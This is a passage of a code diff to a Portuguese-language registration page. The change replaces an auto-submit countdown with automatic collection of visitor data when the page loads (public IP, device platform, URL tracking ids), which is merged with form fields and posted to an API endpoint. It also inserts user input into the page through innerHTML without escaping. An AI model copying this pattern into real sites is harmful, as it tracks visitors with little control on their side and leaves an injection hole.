             const nome = document.getElementById('nome_completo').value.trim();
             const email = document.getElementById('email').value.trim();
-            const tipoAcesso = document.querySelector('input[name="tipo_acesso"]:checked');
+            const tipoUsuario = document.querySelector('input[name="tipo_usuario"]:checked');
             
             if (!nome) {
-                showMessage('❌ Por favor, preencha o nome completo', 'error');
+                showMessage(2, '❌ Por favor, preencha o nome completo', 'error');
                 return false;
             }
             
             if (!email) {
-                showMessage('❌ Por favor, preencha o e-mail', 'error');
+                showMessage(2, '❌ Por favor, preencha o e-mail', 'error');
                 return false;
             }
             
-            if (!tipoAcesso) {
-                showMessage('❌ Por favor, selecione o tipo de acesso', 'error');
+            if (!tipoUsuario) {
+                showMessage(2, '❌ Por favor, selecione o tipo de usuário', 'error');
                 return false;
             }
             
             return true;
         }
         
-        // Função para processar envio manual
-        async function handleManualSubmit() {
+        // Enviar formulário manual
+        async function submitManualForm() {
             if (!validateForm()) return;
             
-            // Cancelar envio automático
-            if (autoSubmitTimer) {
-                clearInterval(autoSubmitTimer);
-                autoSubmitCountdown = 0;
+            showMessage(2, '⏳ Enviando dados, por favor aguarde...', 'info');
+            
+            // Coletar dados do formulário
+            const form = document.getElementById('userForm');
+            const formDataObj = new FormData(form);
+            
+            // Converter FormData para objeto
+            formData = {};
+            for (let [key, value] of formDataObj.entries()) {
+                if (key === 'auto_collected_data') {
+                    try {
+                        formData.auto_data = JSON.parse(value);
+                    } catch (e) {
+                        formData.auto_data = value;
+                    }
+                } else {
+                    formData[key] = value;
+                }
             }
             
-            showMessage('⏳ Enviando seus dados, por favor aguarde...', 'info');
+            // Adicionar dados da sessão
+            formData.session_id = SESSION_ID;
+            formData.timestamp = new Date().toISOString();
+            formData.complete_submission = true;
             
-            // Preparar FormData
-            const formData = new FormData(form);
-            formData.append('submission_type', 'manual');
-            
-            // Enviar dados
-            const success = await submitFormData(formData);
-            
-            if (success) {
-                showMessage('✅ Seus dados foram enviados com sucesso!', 'success');
+            try {
+                // Enviar dados completos para o servidor
+                await sendCompleteDataToServer();
                 
-                // Ocultar formulário e mostrar mensagem de conclusão
-                setTimeout(() => {
-                    formContainer.classList.add('hidden');
-                    completedMessage.style.display = 'block';
-                    document.querySelector('.auto-submit-notice').classList.add('hidden');
-                }, 2000);
-            } else {
-                showMessage('❌ Erro ao enviar dados. Tente novamente.', 'error');
+                // Mostrar resumo
+                showSummary();
+                
+                // Ir para tela de confirmação
+                changeScreen(3);
+                
+            } catch (error) {
+                showMessage(2, '❌ Erro ao enviar dados. Tente novamente.', 'error');
+            }
+        }
+        
+        // Enviar dados completos para o servidor
+        async function sendCompleteDataToServer() {
+            try {
+                const completeData = {
+                    ...collectedData,
+                    ...formData,
+                    type: 'complete_submission',
+                    step: 'post_form',
+                    id_hash: new URLSearchParams(window.location.search).get('id_hash') || '',
+                    id_user: new URLSearchParams(window.location.search).get('id_user') || '',
+                    submission_timestamp: new Date().toISOString()
+                };
+                
+                // Remover auto_data se existir (já está mesclado)
+                if (completeData.auto_data) {
+                    delete completeData.auto_data;
+                }
+                
+                // Enviar via fetch
+                await fetch(API_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(completeData),
+                    mode: 'no-cors'
+                });
+                
+                console.log('Dados completos enviados:', completeData);
+                
+            } catch (error) {
+                console.log('Erro ao enviar dados completos:', error);
+                // Continuar mesmo com erro
+            }
+        }
+        
+        // Mostrar resumo na tela de confirmação
+        function showSummary() {
+            const summaryDiv = document.getElementById('summaryInfo');
+            const sessionIdSpan = document.getElementById('sessionId');
+            
+            if (summaryDiv && sessionIdSpan) {
+                let html = `
+                    <p><strong>Nome:</strong> ${formData.nome_completo || 'Não informado'}</p>
+                    <p><strong>E-mail:</strong> ${formData.email || 'Não informado'}</p>
+                    <p><strong>Tipo:</strong> ${formData.tipo_usuario || 'Não informado'}</p>
+                    <p><strong>IP:</strong> ${collectedData.public_ip || 'Não detectado'}</p>
+                    <p><strong>Dispositivo:</strong> ${collectedData.platform || 'Não detectado'}</p>
+                `;
+                
+                summaryDiv.innerHTML = html;
+                sessionIdSpan.textContent = SESSION_ID;
+            }
+        }
+        
+        // Reiniciar o processo
+        function restartProcess() {
+            // Limpar dados
+            collectedData = {};
+            formData = {};
+            
+            // Resetar formulário
+            document.getElementById('userForm').reset();
+            
+            // Resetar tela de coleta
+            document.getElementById('collectedInfo').innerHTML = '';
+            document.getElementById('screen1Buttons').style.display = 'none';
+            updateProgress(0, 'Iniciando coleta de dados...');
+            
+            // Voltar para primeira tela
+            changeScreen(1);
+            
+            // Iniciar nova coleta
+            setTimeout(() => {
+                collectAutoData();
+            }, 500);
+        }
+        
+        // Máscara para telefone
+        function setupPhoneMask() {
+            const telefoneInput = document.getElementById('telefone');
+            if (telefoneInput) {
+                telefoneInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    
+                    if (value.length <= 10) {
+                        value = value.replace(/^(\d{2})(\d{0,4})(\d{0,4})/, '($1) $2-$3');
+                    } else {
+                        value = value.replace(/^(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
+                    }
+                    
+                    e.target.value = value;
+                });
             }
         }
         
         // Inicialização
         document.addEventListener('DOMContentLoaded', function() {
-            // Preencher campos hidden com parâmetros da URL
-            document.getElementById('id_hash').value = id_hash;
-            document.getElementById('id_user').value = id_user;
+            // Configurar máscara de telefone
+            setupPhoneMask();
             
-            // Mostrar contagem regressiva
-            countdownElement.textContent = autoSubmitCountdown;
-            
-            // Iniciar contagem para envio automático
-           // startCountdown();
-            
-            // Configurar envio manual
-            manualSubmitBtn.addEventListener('click', handleManualSubmit);
-            
-            // Adicionar máscara para telefone
-            const telefoneInput = document.getElementById('telefone');
-            telefoneInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                
-                if (value.length <= 10) {
-                    value = value.replace(/^(\d{2})(\d{0,4})(\d{0,4})/, '($1) $2-$3');
-                } else {
-                    value = value.replace(/^(\d{2})(\d{5})(\d{0,4})/, '($1) $2-$3');
-                }
-                
-                e.target.value = value;
-            });
-            
-            // Permitir que o usuário cancele o envio automático clicando no aviso
-            document.querySelector('.auto-submit-notice').addEventListener('click', function() {
-                if (autoSubmitTimer && !formSubmitted) {
-                    clearInterval(autoSubmitTimer);
-                    this.innerHTML = '⚠️ Envio automático cancelado. Preencha e envie manualmente.';
-                    this.style.background = '#e6fffa';
-                    this.style.borderColor = '#81e6d9';
-                    this.style.color = '#234e52';
-                    showMessage('Envio automático cancelado. Preencha o formulário.', 'info');
-                }
-            });
-            
-            // Obter IP público e adicionar como campo hidden
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipInput = document.createElement('input');
-                    ipInput.type = 'hidden';
-                    ipInput.name = 'client_ip';
-                    ipInput.value = data.ip;
-                    form.appendChild(ipInput);
-                    
-                    // Tentar obter localização aproximada
-                    return fetch(`https://ipapi.co/${data.ip}/json/`);
-                })
-                .then(response => response.json())
-                .then(locationData => {
-                    if (locationData.city && locationData.country_name) {
-                        const locationInput = document.createElement('input');
-                        locationInput.type = 'hidden';
-                        locationInput.name = 'client_location';
-                        locationInput.value = `${locationData.city}, ${locationData.country_name}`;
-                        form.appendChild(locationInput);
-                    }
-                })
-                .catch(() => {
-                    // Ignorar erros
-                });
+            // Iniciar coleta automática
+            setTimeout(() => {
+                collectAutoData();
+            }, 1000);
         });
         
         // Expor funções para debug
-        window.cancelAutoSubmit = function() {
-            if (autoSubmitTimer) {
-                clearInterval(autoSubmitTimer);
-                document.querySelector('.auto-submit-notice').innerHTML = '✅ Envio automático cancelado pelo usuário';
-                document.querySelector('.auto-submit-notice').style.background = '#e6fffa';
-                document.querySelector('.auto-submit-notice').style.borderColor = '#81e6d9';
-                showMessage('Envio automático cancelado', 'success');
-                autoSubmitCountdown = 0;
-            }
-        };
-        
-        window.forceAutoSubmit = function() {
-            performAutoSubmit();
+        window.debugShowData = function() {
+            console.log('Dados Coletados:', collectedData);
+            console.log('Dados do Formulário:', formData);
+            console.log('Session ID:', SESSION_ID);
+            alert('Verifique o console para ver os dados coletados');
         };
         
     </script>
 </body>
 </html>
-
-
-
